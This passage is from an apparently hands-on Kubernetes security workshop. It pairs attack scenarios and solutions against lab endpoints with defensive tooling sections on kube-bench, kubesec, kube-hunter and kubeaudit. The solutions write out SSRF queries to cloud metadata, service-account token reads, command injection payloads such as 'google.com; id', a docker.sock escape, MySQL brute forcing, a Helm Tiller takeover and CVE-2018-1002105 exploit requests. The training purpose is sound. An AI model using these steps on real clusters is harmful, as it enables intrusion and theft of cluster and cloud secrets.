<li>Endpoint for your attack is <code>http://server-health.student-uniquename.cloudsec.training</code>. Replace <code>uniquename</code> with your unique name</li>
<li>The login credentials for the application are <code>username: serveradmin</code> and <code>password: monitorworld</code></li>
<li>Useful reference: <a href="https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata">Google Instance Metadata</a> <code>169.254.169.254</code></li>
</ul>
<h1><a class="header" href="#attacking-kubernetes-cluster-metadata-using-application-ssrf-vulnerability---solution" id="attacking-kubernetes-cluster-metadata-using-application-ssrf-vulnerability---solution">Attacking Kubernetes cluster Metadata using application SSRF vulnerability - Solution</a></h1>
<ul>
<li>
<p>Navigate to the application <code>http://server-health.student-uniquename.cloudsec.training</code></p>
</li>
<li>
<p>Login to the application using <code>username: serveradmin</code> and <code>password: monitorworld</code></p>
</li>
</ul>
<p><img src="scenario-2/images/app-login.png" alt="" /></p>
<ul>
<li>The application supports functionality to check server health. Let's give <code>https://icanhazip.com</code> to check the public IP address</li>
</ul>
<p><img src="scenario-2/images/check-ip.png" alt="" /></p>
<ul>
<li>As this setup is running on GCP, we can query the internal metadata using the standard endpoint <code>http://169.254.169.254/computeMetadata/v1/</code></li>
</ul>
<p><img src="scenario-2/images/internal-metadata.png" alt="" /></p>
<ul>
<li>Similarly we can query all the sensitive information, including the Kubernetes secrets and other information related to Cloud Platform <code>http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env</code></li>
</ul>
<p><img src="scenario-2/images/kube-env-metadata.png" alt="" /></p>
<ul>
<li>Also, we can find the flag by <code>http://169.254.169.254/computeMetadata/v1/instance/attributes/flag</code></li>
</ul>
<pre><code class="language-bash">59a4c760306d682ca75d690bebb9db0e
</code></pre>
<p><img src="scenario-2/images/flag-metadata.png" alt="" /></p>
<h1><a class="header" href="#discussion-1" id="discussion-1">Discussion</a></h1>
<p><img src="scenario-2/images/discussion.png" alt="" /></p>
<p>Image Source: <a href="https://commons.wikimedia.org/wiki/File:Discussion.png">https://commons.wikimedia.org/wiki/File:Discussion.png</a></p>
<h1><a class="header" href="#scenario-3---testing-for-the-sensitive-configurations-and-secrets-in-kubernetes-cluster" id="scenario-3---testing-for-the-sensitive-configurations-and-secrets-in-kubernetes-cluster">Scenario-3 - Testing for the sensitive configurations and secrets in Kubernetes cluster</a></h1>
<ul>
<li><a href="scenario-3/scenario.html">Scenario</a></li>
<li><a href="scenario-3/solution.html">Solution</a></li>
<li><a href="scenario-3/discussion.html">Discussion</a></li>
</ul>
<h1><a class="header" href="#testing-for-the-sensitive-configurations-and-secrets-in-kubernetes-cluster---scenario" id="testing-for-the-sensitive-configurations-and-secrets-in-kubernetes-cluster---scenario">Testing for the sensitive configurations and secrets in Kubernetes cluster - Scenario</a></h1>
<p>Bob's company has deployed their code base to production Kubernetes cluster. Alas, this application has secrets which gives access to their AWS Cloud and other API endpoints! Most of which arise from default configurations, misconfigurations and bad programming practices. There has been speculation that the team directly deploys code from version control system to production!</p>
<p>In any case, as an attacker you know that the application is deployed in Kubernetes, which contains secrets to access the different cloud provider, API endpoints. Who knows what all secrets you may find!</p>
<h2><a class="header" href="#tips-2" id="tips-2">Tips</a></h2>
<ul>
<li>Execute below command to start a shell into the pod to get started</li>
</ul>
<pre><code class="language-bash">export CODEBASE_POD_NAME=$(kubectl get pods --selector app=code-base -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
kubectl exec -it $CODEBASE_POD_NAME sh
</code></pre>
<h1><a class="header" href="#testing-for-the-sensitive-configurations-and-secrets-in-kubernetes-cluster---solution" id="testing-for-the-sensitive-configurations-and-secrets-in-kubernetes-cluster---solution">Testing for the sensitive configurations and secrets in Kubernetes cluster - Solution</a></h1>
<h2><a class="header" href="#exec-into-pod" id="exec-into-pod">Exec into Pod</a></h2>
<ul>
<li>Get pod details and login to the <code>code-base</code> pod using below command</li>
</ul>
<pre><code class="language-bash">export CODEBASE_POD_NAME=$(kubectl get pods --selector app=code-base -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
kubectl exec -it $CODEBASE_POD_NAME sh
</code></pre>
<p><img src="scenario-3/images/exec-pod.png" alt="" /></p>
<h2><a class="header" href="#kubernetes-service-account" id="kubernetes-service-account">Kubernetes Service Account</a></h2>
<ul>
<li>
<p>Now we can look for sensitive information by navigating the file system</p>
</li>
<li>
<p>Look in the default kubernetes locations</p>
</li>
</ul>
<pre><code class="language-bash">ls -l /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
</code></pre>
<p><img src="scenario-3/images/default-svc.png" alt="" /></p>
<ul>
<li>Explore permissions available to service account using <code>kubectl auth can-i</code></li>
</ul>
<p><code>kubectl</code> can be downloaded inside the Pod from <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl-on-linux">Install Kubectl</a></p>
<h2><a class="header" href="#check-environment" id="check-environment">Check Environment</a></h2>
<ul>
<li>Check for the environment variables</li>
</ul>
<p><img src="scenario-3/images/printenv.png" alt="" /></p>
<h2><a class="header" href="#app-secrets" id="app-secrets">App Secrets</a></h2>
<ul>
<li>Find the app and the <code>.git</code> folder inside it which has old commits containing the sensitive information</li>
</ul>
<pre><code class="language-bash">cd /app
ls -la
git log
git checkout f17a07721ab9acec96aef0b1794ee466e516e37a
ls -la
cat .env
</code></pre>
<p><img src="scenario-3/images/git-app.png" alt="" />
<img src="scenario-3/images/commit-log.png" alt="" />
<img src="scenario-3/images/revert-and-secrets.png" alt="" /></p>
<h1><a class="header" href="#discussion-2" id="discussion-2">Discussion</a></h1>
<p><img src="scenario-3/images/discussion.png" alt="" /></p>
<p>Image Source: <a href="https://commons.wikimedia.org/wiki/File:Discussion.png">https://commons.wikimedia.org/wiki/File:Discussion.png</a></p>
<h1><a class="header" href="#scenario-4---docker-escape-using-pod-volume-mounts-to-access-the-nodes-and-host-systems" id="scenario-4---docker-escape-using-pod-volume-mounts-to-access-the-nodes-and-host-systems">Scenario-4 - Docker escape using Pod Volume Mounts to access the nodes and host systems</a></h1>
<ul>
<li><a href="scenario-4/scenario.html">Scenario</a></li>
<li><a href="scenario-4/solution.html">Solution</a></li>
<li><a href="scenario-4/discussion.html">Discussion</a></li>
</ul>
<h1><a class="header" href="#docker-escape-using-pod-volume-mounts-to-access-the-nodes-and-host-systems---scenario" id="docker-escape-using-pod-volume-mounts-to-access-the-nodes-and-host-systems---scenario">Docker escape using Pod Volume Mounts to access the nodes and host systems - Scenario</a></h1>
<p>Bob's company has a lot of helpful applications for their IT admins. The same developers who built the Server Health Check application, also built a &quot;Connectivity check&quot; application. Well, they obviously re-used the code (who doesn't!) leading to an interesting vulnerability.</p>
<p>Instead of making a web request now, this application makes ping requests to a server that Bob specifies. And we all know the quickest way to make a ping request is to execute the <code>ping</code> command.</p>
<p>Web applications that execute OS commands using user input can fall prey to OS command injection vulnerabilities which would allow an attacker (our dear Bob in this case) to execute any accesible OS command through the user input fields. Oh and it's even more exciting if this application is running on docker!</p>
<p>Let's hack this box and see where we can go from here :)</p>
<h2><a class="header" href="#tips-3" id="tips-3">Tips</a></h2>
<ul>
<li>Endpoint for your attack is <code>http://connectivity-check.student-uniquename.cloudsec.training</code>. Replace <code>uniquename</code> with your unique name</li>
<li>Login to the application using <code>username: sysadmin</code> and <code>password: superpowers</code></li>
</ul>
<h1><a class="header" href="#docker-escape-using-pod-volume-mounts-to-access-the-node-and-host-systems---solution" id="docker-escape-using-pod-volume-mounts-to-access-the-node-and-host-systems---solution">Docker escape using Pod Volume Mounts to access the node and host systems - Solution</a></h1>
<ul>
<li>
<p>Navigate to the application <code>http://connectivity-check.student-uniquename.cloudsec.training</code></p>
</li>
<li>
<p>Login to the application using <code>username: sysadmin</code> and <code>password: superpowers</code></p>
</li>
</ul>
<p><img src="scenario-4/images/app-login.png" alt="" /></p>
<ul>
<li>Now try pinging <code>google.com</code></li>
</ul>
<p><img src="scenario-4/images/ping-google.png" alt="" /></p>
<ul>
<li>We can see that application is running the <code>ping</code> system command by looking at the output. Let's run some other system command by using a semicolon to separate two commands, as we know it's running in Linux system. For example, providing an input of <code>google.com; id</code> would trigger <code>ping -c 2 google.com;id</code> in the backend.</li>
</ul>
<p><img src="scenario-4/images/ping-google-id.png" alt="" /></p>
<ul>
<li>
<p>Now that we have confirmed that the application is vulnerable to a command injection vulnerability. we can execute other commands and do other interesting stuff within this container.</p>
</li>
<li>
<p>Let's explore the file system and other services. Start by looking inside the custom docker container.</p>
</li>
</ul>
<pre><code class="language-bash">;ls -l /custom/docker/
</code></pre>
<p><img src="scenario-4/images/custom-docker-socket.png" alt="" /></p>
<ul>
<li>
<p>Looks like the <code>docker.sock</code> is mounted from the host system as a volume mount</p>
</li>
<li>
<p>Download the docker binary to access this socket and perform docker operations within the container</p>
</li>
</ul>
<pre><code class="language-bash">;wget https://download.docker.com/linux/static/stable/x86_64/docker-18.09.1.tgz -O /root/docker-18.09.1.tgz
</code></pre>
<p><img src="scenario-4/images/download-docker.png" alt="" /></p>
<ul>
<li>Now let's extract the binary to root system</li>
</ul>
<pre><code class="language-bash">;tar -xvzf /root/docker-18.09.1.tgz -C /root/
</code></pre>
<p><img src="scenario-4/images/extract-docker-binary.png" alt="" /></p>
<ul>
<li>Now, we can gain access to the host system by running the following docker commands</li>
</ul>
<pre><code class="language-bash">;/root/docker/docker -H unix:///custom/docker/docker.sock ps

;/root/docker/docker -H unix:///custom/docker/docker.sock images
</code></pre>
<p><img src="scenario-4/images/host-docker-containers.png" alt="" /></p>
<p><img src="scenario-4/images/host-docker-images.png" alt="" /></p>
<h1><a class="header" href="#discussion-3" id="discussion-3">Discussion</a></h1>
<p><img src="scenario-4/images/discussion.png" alt="" /></p>
<p>Image Source: <a href="https://commons.wikimedia.org/wiki/File:Discussion.png">https://commons.wikimedia.org/wiki/File:Discussion.png</a></p>
<h1><a class="header" href="#scenario-5---attacking-applications-in-different-namespaces-in-kubernetes-cluster" id="scenario-5---attacking-applications-in-different-namespaces-in-kubernetes-cluster">Scenario-5 - Attacking applications in different namespaces in Kubernetes cluster</a></h1>
<ul>
<li><a href="scenario-5/scenario.html">Scenario</a></li>
<li><a href="scenario-5/solution.html">Solution</a></li>
<li><a href="scenario-5/discussion.html">Discussion</a></li>
</ul>
<h1><a class="header" href="#attacking-applications-in-different-namespaces-in-kubernetes-cluster---scenario" id="attacking-applications-in-different-namespaces-in-kubernetes-cluster---scenario">Attacking applications in different namespaces in Kubernetes cluster - Scenario</a></h1>
<p>Bob's friend in IT, Kevin manages the Kubernetes cluster for his company along with his teammate James. It's a little sad, but Kevin and James do not share their work with each other.</p>
<p>It turns out James has setup a MySQL server on the same Kubernetes cluster but on a different namespace. But given that they are both on the same Kubernetes cluster, they appear to be on the same network! Well that is because, most Kubernetes clusters are setup without network segregation between namespaces.</p>
<p>Can you help Kevin gain access to James' MySQL server to see what shady secrets he has been hiding?</p>
<h2><a class="header" href="#tips-4" id="tips-4">Tips</a></h2>
<p>By default, Kubernetes does not restrict traffic between pods running inside the cluster. This means any pod can connect to any other pod as there are no firewalls controlling the intra-cluster traffic.</p>
<ul>
<li>Executing below commands to into the pod to get started</li>
</ul>
<pre><code class="language-bash">export NET_TOOLS_POD=$(kubectl get pods --selector app=net-tools -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
kubectl exec -it $NET_TOOLS_POD bash
</code></pre>
<h1><a class="header" href="#attacking-applications-in-different-namespaces-in-kubernetes-cluster---solution" id="attacking-applications-in-different-namespaces-in-kubernetes-cluster---solution">Attacking applications in different namespaces in Kubernetes cluster - Solution</a></h1>
<ul>
<li>Get pod details and login to the <code>net-tools</code> pod using below command.</li>
</ul>
<pre><code class="language-bash">export NET_TOOLS_POD=$(kubectl get pods --selector app=net-tools -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
kubectl exec -it $NET_TOOLS_POD bash
</code></pre>
<p><img src="scenario-5/images/get-pod-name.png" alt="" /></p>
<ul>
<li>As MySQL runs on port 3306 by default, we can scan the IP range for this port</li>
</ul>
<pre><code class="language-bash">nmap -n -Pn -p3306 --open -sS -T5 10.36.4.0/24
</code></pre>
<p><img src="scenario-5/images/nmap-scan.png" alt="" /></p>
<ul>
<li>Once we have discovered the MySQL service, we can brute force the credentials to login into the server. We can run a brute force attack using nmap and its scripting engine.</li>
</ul>
<pre><code class="language-bash">echo root &gt; users.txt
nmap --script mysql-brute 10.36.4.30 -p3306 -T4 --script-args &quot;userdb=users.txt&quot;
</code></pre>
<p><img src="scenario-5/images/nmap-mysql-bruteforce.png" alt="" /></p>
<ul>
<li>Once the credentials are discovered, we can access the MySQL instance with obtained password within the cluster network in different namespace</li>
</ul>
<pre><code class="language-bash">mysql -u root -psecret -h 10.36.4.30
</code></pre>
<p><img src="scenario-5/images/mysql-access.png" alt="" /></p>
<ul>
<li>Verify the pods, svc available in the <code>database</code> namespace</li>
</ul>
<pre><code class="language-bash">kubectl get ns
kubectl get all -n database
</code></pre>
<p><img src="scenario-5/images/get-ns-data.png" alt="" /></p>
<h3><a class="header" href="#refernces" id="refernces">Refernces</a></h3>
<ul>
<li><a href="https://ahmet.im/blog/kubernetes-network-policy/">https://ahmet.im/blog/kubernetes-network-policy/</a></li>
<li><a href="https://cloud.google.com/kubernetes-engine/docs/how-to/flexible-pod-cidr">Google Cloud Cluster CIDR</a></li>
</ul>
<h1><a class="header" href="#discussion-4" id="discussion-4">Discussion</a></h1>
<p><img src="scenario-5/images/discussion.png" alt="" /></p>
<p>Image Source: <a href="https://commons.wikimedia.org/wiki/File:Discussion.png">https://commons.wikimedia.org/wiki/File:Discussion.png</a></p>
<h1><a class="header" href="#scenario-6---attacking-helm-tiller-without-rbac-setup" id="scenario-6---attacking-helm-tiller-without-rbac-setup">Scenario-6 - Attacking Helm tiller without RBAC setup</a></h1>
<ul>
<li><a href="scenario-6/scenario.html">Scenario</a></li>
<li><a href="scenario-6/solution.html">Solution</a></li>
<li><a href="scenario-6/discussion.html">Discussion</a></li>
</ul>
<h1><a class="header" href="#attacking-helm-tiller-without-rbac-setup---scenario" id="attacking-helm-tiller-without-rbac-setup---scenario">Attacking Helm tiller without RBAC setup - Scenario</a></h1>
<p>Bob has managed to gain access to a pod inside a K8S cluster. Bob knows that the default Kubernetes cluster deployments have very poor Role Based Access Control mechanisms.</p>
<p>Bob knows that he should be able to get the Kubernetes cluster admin access by using Helm and the Tiller service.</p>
<p>Let's help Bob get the cluster admin access out of this cluster!</p>
<h2><a class="header" href="#tips-5" id="tips-5">Tips</a></h2>
<ul>
<li>You can run the below command to get shell with enough tools to get cluster admin access</li>
</ul>
<pre><code class="language-bash">kubectl run -n default --quiet --rm --restart=Never -ti --image=madhuakula/helm-security incluster
</code></pre>
<h1><a class="header" href="#attacking-helm-tiller-without-rbac-setup---solution" id="attacking-helm-tiller-without-rbac-setup---solution">Attacking Helm tiller without RBAC setup - Solution</a></h1>
<ul>
<li>
<p>Let's assume that you already have access to a pod inside a cluster using an application vulnerability (Ex: Command Injection)</p>
</li>
<li>
<p>Then we can run the below command to deploy simple pod which contains <code>helm</code> and <code>kubectl</code> binaries</p>
</li>
</ul>
<pre><code class="language-bash">kubectl run -n default --quiet --rm --restart=Never -ti --image=madhuakula/helm-security incluster
</code></pre>
<p><img src="scenario-6/images/deploy-pod.png" alt="" /></p>
<ul>
<li>If we check the version of the helm, it responds with <code>Error: pods is forbidden: User &quot;system:serviceaccount:default:default&quot; cannot list pods in the namespace &quot;kube-system&quot;</code>. Means client not able to establish connection with server</li>
</ul>
<pre><code class="language-bash">helm version
</code></pre>
<ul>
<li>Let's telnet to Tiller's default service and port. We can connect to <code>tiller-deploy.kube-system</code> on port <code>44134</code></li>
</ul>
<pre><code class="language-bash">telnet tiller-deploy.kube-system 44134

Ctrl+C
</code></pre>
<p><img src="scenario-6/images/telnet-tiller.png" alt="" /></p>
<ul>
<li>Now we can use the helm with host flag to talk to the server <code>helm --host tiller-deploy.kube-system:44134 version</code></li>
</ul>
<p><img src="scenario-6/images/helm-with-host-flag.png" alt="" /></p>
<ul>
<li>Let's try getting the secrets from <code>kube-system</code> namespace using kubectl <code>kubectl get secrets -n kube-system</code>. We can clearly see that we can't get the secrets with default service account attached to this pod</li>
</ul>
<p><img src="scenario-6/images/kubectl-secrets-before-attack.png" alt="" /></p>
<ul>
<li>Let's go ahead and deploy our <code>pwnchart</code> helm chart</li>
</ul>
<pre><code class="language-bash">helm --host tiller-deploy.kube-system:44134 install /pwnchart
</code></pre>
<p><img src="scenario-6/images/helm-deploy-pwnchart.png" alt="" /></p>
<ul>
<li>Now let's try again to get the secrets from <code>kube-system</code> namespace using kubectl <code>kubectl get secrets -n kube-system</code>.</li>
</ul>
<p><img src="scenario-6/images/kube-secrets-after-attack.png" alt="" /></p>
<ul>
<li>We now have full cluster access to do whatever a cluster admin can do</li>
</ul>
<h1><a class="header" href="#discussion-5" id="discussion-5">Discussion</a></h1>
<p><img src="scenario-6/images/discussion.png" alt="" /></p>
<p>Image Source: <a href="https://commons.wikimedia.org/wiki/File:Discussion.png">https://commons.wikimedia.org/wiki/File:Discussion.png</a></p>
<h1><a class="header" href="#running-kube-bench" id="running-kube-bench">Running kube-bench</a></h1>
<p>kube-bench is a Go application that checks whether Kubernetes is deployed securely by running the checks documented in the <a href="https://www.cisecurity.org/benchmark/kubernetes/">CIS Kubernetes Benchmark</a>.</p>
<ol>
<li>Master Node Security Configuration
<ul>
<li>API Server</li>
<li>Scheduler</li>
<li>Controller Manager</li>
<li>Configuration Files</li>
<li>etcd</li>
<li>General Security Primitives</li>
<li>PodSecurityPolicices</li>
</ul>
</li>
<li>Workere Node Security Configuration
<ul>
<li>Kubelet</li>
<li>Configuration Files</li>
</ul>
</li>
</ol>
<h2><a class="header" href="#how-to-run-kube-bench" id="how-to-run-kube-bench">How to run kube-bench</a></h2>
<ul>
<li>We can run kube-bench by navigating to the <code>cd /data/kube-bench</code></li>
</ul>
<pre><code class="language-bash">kubectl apply -f kube-bench-node.yaml
</code></pre>
<ul>
<li>Check the job status and get the pod name</li>
</ul>
<pre><code class="language-bash">kubectl get pods --selector job-name=kube-bench-node
</code></pre>
<p><img src="kube-bench/images/get-kube-bench-pod.png" alt="" /></p>
<ul>
<li>See the kube-bench node scan results by checking the stdout logs</li>
</ul>
<pre><code class="language-bash">kubectl logs &lt;PODNAME&gt;
</code></pre>
<p><img src="kube-bench/images/kube-bench-results.png" alt="" /></p>
<blockquote>
<p>Note: Here we are running only for the Kubernetes nodes as this cluster is managed by GCP. We can also run master checks by referring to https://github.com/aquasecurity/kube-bench</p>
</blockquote>
<h1><a class="header" href="#running-kubesecio" id="running-kubesecio">Running kubesec.io</a></h1>
<p>Kubesec quantifies risk for Kubernetes resources by validating the configuration files and manifest files used for Kubernetes deployments and operations.</p>
<h2><a class="header" href="#how-to-run-kubesec" id="how-to-run-kubesec">How to run kubesec</a></h2>
<ul>
<li>Replace the <code>${FILE}</code> with the filename which you want to perform the scan</li>
</ul>
<pre><code class="language-bash">cd /data/kubesec
curl --silent --compressed --connect-timeout 5 https://kubesec.io -F file=@&quot;${FILE}&quot;
</code></pre>
<ul>
<li>Run for the <code>insecuredeployment.yaml</code></li>
</ul>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: kubesec-demo
spec:
  containers:
  - name: kubesec-demo
    image: gcr.io/google-samples/node-hello:1.0
    securityContext:
      privileged: true
      readOnlyRootFilesystem: true
</code></pre>
<pre><code class="language-bash">curl --silent --compressed --connect-timeout 5 https://kubesec.io -F file=@&quot;insecuredeployment.yaml&quot;
</code></pre>
<p><img src="kubesec/images/insecure-deployment.png" alt="" /></p>
<ul>
<li>Run for the <code>securedeployment.yaml</code></li>
</ul>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: kubesec-demo
spec:
  containers:
  - name: kubesec-demo
    image: gcr.io/google-samples/node-hello:1.0
    securityContext:
      runAsNonRoot: true
      capabilities: 
        drop: [&quot;ALL&quot;]
        add: [&quot;NET_ADMIN&quot;, &quot;SYS_TIME&quot;]
      readOnlyRootFilesystem: true
      runAsUser: 100000
    resources:
      requsts:
        cpu: 20m
        memory: 30Mi
      limits:
        cpu: 10m
        memory: 20Mi
</code></pre>
<pre><code class="language-bash">curl --silent --compressed --connect-timeout 5 https://kubesec.io -F file=@&quot;securedeployment.yaml&quot;
</code></pre>
<p><img src="kubesec/images/secure-deployment.png" alt="" /></p>
<h3><a class="header" href="#references-8" id="references-8">References</a></h3>
<ul>
<li><a href="https://kubesec.io/">https://kubesec.io</a></li>
<li><a href="https://xsses.rocks/kubernetes-systems-hacked-to-mine-xmr/">https://xsses.rocks/kubernetes-systems-hacked-to-mine-xmr</a></li>
</ul>
<h1><a class="header" href="#running-kube-hunter" id="running-kube-hunter">Running kube-hunter</a></h1>
<p>Kube-hunter hunts for security weaknesses in Kubernetes clusters. The tool was developed to increase awareness and visibility for security issues in Kubernetes environments. <strong>You should NOT run kube-hunter on a Kubernetes cluster you don't own!</strong></p>
<h2><a class="header" href="#how-to-run-kube-hunter" id="how-to-run-kube-hunter">How to run kube-hunter</a></h2>
<ul>
<li>IP addresses can be obtained by running the following command</li>
</ul>
<pre><code class="language-bash">kubectl cluster-info
kubectl get nodes -o wide
</code></pre>
<p><img src="kube-hunter/images/get-ip-info.png" alt="" /></p>
<ul>
<li>Let's run kube-hunter from outside the cluster as a black box. Select the option <code>1</code> to perform &quot;Remote Scanning&quot;.</li>
</ul>
<pre><code class="language-bash">cd /data/kube-hunter
./kube-hunter.py
</code></pre>
<p><img src="kube-hunter/images/kube-hunter-external.png" alt="" /></p>
<ul>
<li>We can also run the kube-hunter as a active scan within the cluster as well</li>
</ul>
<pre><code class="language-bash">cd /data/kube-hunter
kubectl apply -f job.yaml
</code></pre>
<ul>
<li>Get the results by looking at stdout logs of the pod</li>
</ul>
<pre><code class="language-bash">kubectl get pods --selector job-name=kube-hunter
kubectl logs &lt;PODNAME&gt;
</code></pre>
<p><img src="kube-hunter/images/kube-hunter-results.png" alt="" /></p>
<h3><a class="header" href="#references-9" id="references-9">References</a></h3>
<ul>
<li><a href="https://github.com/aquasecurity/kube-hunter">https://github.com/aquasecurity/kube-hunter</a></li>
</ul>
<h1><a class="header" href="#running-kubeaudit" id="running-kubeaudit">Running kubeaudit</a></h1>
<p>kubeaudit is a command line tool to audit Kubernetes clusters for various different security concerns:</p>
<ul>
<li>run the container as a non-root user</li>
<li>use a read only root filesystem</li>
<li>drop scary capabilities</li>
<li>don't add new ones</li>
<li>don't run privileged</li>
<li>etc.</li>
</ul>
<h2><a class="header" href="#how-to-run-kubeaudit" id="how-to-run-kubeaudit">How to run kubeaudit</a></h2>
<ul>
<li>Running the <code>kubeaudit</code> with all checks</li>
</ul>
<pre><code class="language-bash">cd /data/kubeaudit
./kubeaudit all
</code></pre>
<p><img src="kubeaudit/images/kubeaudit.png" alt="" /></p>
<blockquote>
<p>We can also use <code>kubeaudit</code> to fix vulnerabilities in a live cluster <code>*Not recommended for production</code></p>
</blockquote>
<h3><a class="header" href="#references-10" id="references-10">References</a></h3>
<ul>
<li><a href="https://github.com/Shopify/kubeaudit">https://github.com/Shopify/kubeaudit</a></li>
</ul>
<h1><a class="header" href="#logging-and-monitoring-for-kubernetes" id="logging-and-monitoring-for-kubernetes">Logging and Monitoring for Kubernetes</a></h1>
<p>We can get more detailed information about kubernetes and it's resources using built-in commands</p>
<ul>
<li>Looking for more information about pods</li>
</ul>
<pre><code class="language-bash">kubectl describe pod &lt;PODNAME&gt;
</code></pre>
<ul>
<li>Looking for logs of pods</li>
</ul>
<pre><code class="language-bash">kubectl logs -f &lt;PODNAME&gt;
</code></pre>
<ul>
<li>Looking complete information about cluster (to debug and diagnose cluster problems)</li>
</ul>
<pre><code class="language-bash">kubectl cluster-info dump
</code></pre>
<ul>
<li>Stack driver logging</li>
</ul>
<p><img src="logging-and-monitoring/images/stack-driver.png" alt="" /></p>
<h1><a class="header" href="#security-checks-for-events-using-sysdig-falco-demo-only" id="security-checks-for-events-using-sysdig-falco-demo-only">Security checks for events using Sysdig Falco (DEMO Only)</a></h1>
<p>In this scenario we will see how we can detect a sensitive file read operation occurring inside a container in a Kubernetes cluster.</p>
<p>We will see how to apply automated defense to automatically stop the attack and apply the fix in near-realtime.</p>
<h2><a class="header" href="#demo" id="demo">DEMO</a></h2>
<p><a href="https://www.youtube.com/watch?v=zd0ksjZI5Vk"><img src="https://img.youtube.com/vi/zd0ksjZI5Vk/0.jpg" alt="Container Security Monitoring - Automated Defense" /></a></p>
<p>source: <a href="https://www.youtube.com/watch?v=zd0ksjZI5Vk">https://www.youtube.com/watch?v=zd0ksjZI5Vk</a></p>
<h1><a class="header" href="#demos" id="demos">DEMO's</a></h1>
<ul>
<li><a href="demos/cve-2018-1002105.html">CVE-2018-1002105</a></li>
<li><a href="demos/cve-2019-5736.html">CVE-2019-5736</a></li>
<li><a href="demos/cve-2019-9901.html">CVE-2019-9901</a></li>
</ul>
<h1><a class="header" href="#cve-2018-1002105---exploiting-kubernetes-api-server-vulnerability" id="cve-2018-1002105---exploiting-kubernetes-api-server-vulnerability">CVE-2018-1002105 - Exploiting Kubernetes API Server Vulnerability</a></h1>
<h2><a class="header" href="#demonstration-video" id="demonstration-video">Demonstration Video</a></h2>
<p><a href="https://www.youtube.com/watch?v=4CTK2aUXTHo"><img src="https://img.youtube.com/vi/4CTK2aUXTHo/0.jpg" alt="Exploiting Kubernetes API Server Vulnerability CVE-2018-1002105" /></a></p>
<p>source: <a href="https://www.youtube.com/watch?v=4CTK2aUXTHo">https://www.youtube.com/watch?v=4CTK2aUXTHo</a></p>
<ul>
<li>Check if the vulnerability exists</li>
</ul>
<pre><code class="language-bash">kubectl version
kubectl get apiservices -o 'jsonpath={range .items[?(@.spec.service.name!=&quot;&quot;)]}{.metadata.name}{&quot;\n&quot;}{end}'
</code></pre>
<h2><a class="header" href="#scenario" id="scenario">Scenario</a></h2>
<ul>
<li>Create a nginx container in the <code>default</code> namespace</li>
</ul>
<pre><code class="language-bash">kubectl run --image=nginx:alpine securenginx
</code></pre>
<pre><code class="language-bash">kubectl get pods
</code></pre>
<ul>
<li>create new <code>marketing</code> namespace with restricted access to only that namespace <code>vi marketing-setup.yaml</code></li>
</ul>
<pre><code class="language-yaml">apiVersion: v1
kind: Namespace
metadata:
  name: marketing
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: marketing-user
  namespace: marketing

---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1beta1
metadata:
  name: marketing-user-full-access
  namespace: marketing
rules:
- apiGroups: [&quot;&quot;, &quot;extensions&quot;, &quot;apps&quot;]
  resources: [&quot;*&quot;]
  verbs: [&quot;*&quot;]
- apiGroups: [&quot;batch&quot;]
  resources:
  - jobs
  - cronjobs
  verbs: [&quot;*&quot;]

---
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1beta1
metadata:
  name: marketing-user-view
  namespace: marketing
subjects:
- kind: ServiceAccount
  name: marketing-user
  namespace: marketing
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: marketing-user-full-access
</code></pre>
<ul>
<li>deploy using</li>
</ul>
<pre><code class="language-bash">kubectl apply -f marketing-setup.yaml
</code></pre>
<ul>
<li>Let's deploy a pod in <code>marketing</code></li>
</ul>
<pre><code class="language-bash">kubectl run restricted --image=madhuakula/attacker-tools -n marketing
</code></pre>
<ul>
<li>Assume that attacker has shell access to restricted pod with RBAC enabled to only <code>marketing</code> namespace. Get token for the SA</li>
</ul>
<pre><code class="language-bash">kubectl get secret marketing-user-token-xxxxx -n marketing -o &quot;jsonpath={.data['token']}&quot; | base64 -d
</code></pre>
<h2><a class="header" href="#exploitation" id="exploitation">Exploitation</a></h2>
<ul>
<li>Get the pods in default namespace</li>
</ul>
<pre><code class="language-bash">kubectl get pods
</code></pre>
<pre><code class="language-bash">ncat -C --ssl 192.168.12.10 6443
GET /api/v1/namespaces/marketing/pods/restricted-xxxxx-xxxx/exec HTTP/1.1
Authorization: Bearer $TOKEN
Host: 192.168.12.10:6443
Connection: upgrade
Upgrade: websocket
</code></pre>
<pre><code class="language-bash">GET /exec/default/securenginx-xxxxx-xxxx/securenginx?command=id&amp;input=0&amp;output=1&amp;tty=0 HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Host: 192.168.12.10:6443
Origin: https://192.168.12.10:6443
Sec-WebSocket-Key: $TOKEN
Sec-WebSocket-Version: 13
sec-websocket-protocol: v4.channel.k8s.io
</code></pre>
<h3><a class="header" href="#references-11" id="references-11">References</a></h3>
<ul>
<li>
<p><a href="https://blog.appsecco.com/analysing-and-exploiting-kubernetes-apiserver-vulnerability-cve-2018-1002105-3150d97b24bb">https://blog.appsecco.com/analysing-and-exploiting-kubernetes-apiserver-vulnerability-cve-2018-1002105-3150d97b24bb</a></p>
</li>
<li>
<p><a href="https://github.com/kubernetes/kubernetes/issues/71411">https://github.com/kubernetes/kubernetes/issues/71411</a></p>
</li>
</ul>
<h1><a class="header" href="#cve-2019-5736---escape-from-docker-and-kubernetes-containers-to-root-on-host" id="cve-2019-5736---escape-from-docker-and-kubernetes-containers-to-root-on-host">CVE-2019-5736 - Escape from Docker and Kubernetes containers to root on host</a></h1>
<p>This scenario demos has been taken from <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a>. Thanks to <a href="https://frichetten.com/">Nick Frichette</a></p>
<p>This is a Go implementation of CVE-2019-5736, a container escape for Docker. The exploit works by overwriting and executing the host systems runc binary from within the container.</p>
<h2><a class="header" href="#how-does-the-exploit-work" id="how-does-the-exploit-work">How does the exploit work?</a></h2>
